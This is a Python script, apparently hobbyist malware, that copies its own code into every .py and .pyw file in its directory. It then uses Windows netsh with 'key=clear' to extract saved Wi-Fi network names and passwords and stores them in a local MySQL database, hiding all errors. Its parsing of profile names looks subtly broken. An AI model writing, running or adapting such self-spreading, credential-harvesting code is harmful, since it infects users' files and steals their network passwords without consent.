import sys,glob
code=[]
with open(sys.argv[0],'r') as f:
    lines = f.readlines()
area=False
for line in lines:
    if line=='import sys,glob\n':
        area=True
    if area:
        code.append(line)
    if line=='pass\n':
        break
python_scripts=glob.glob('*.py')+glob.glob('*.pyw')
for script in python_scripts:
    with open(script,'r') as f:
        script_code=f.readlines()
    injected=False
    for line in script_code:
        if line=='import sys,glob\n':
            injected=True
            break
    if not injected:
        final_code=[]
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        with open(script,'w') as f:
            f.writelines(final_code)
import subprocess
try:
    import mysql.connector
except:
    import pip
    pip.main(["install", "mysql-connector-python"])
    import mysql.connector
try:
    db=mysql.connector.connect(host="localhost", user="root", passwd="root", database="wifi-registry")
    mycursor=db.cursor()
    data=subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
    wifis=[line.split('.')[1][1:-1] for line in data if "All User Profile" in line]
    for wifi in wifis:
        results=subprocess.check_output(['netsh','wlan','show','profile',wifi,'key=clear']).decode('utf-8').split('\n')
        results=[line.split(':')[1][1:-1] for line in results if "Key Content" in line]
        try:
            mycursor.execute("INSERT INTO registry (wifi, passwd) VALUES (%s, %s)", (wifi, results))
        except:
            mycursor.execute("INSERT INTO registry (wifi, passwd) VALUES (%s, %s)", (wifi, ''))
        db.commit()
    mycursor.close()
    db.close()
except:
    pass
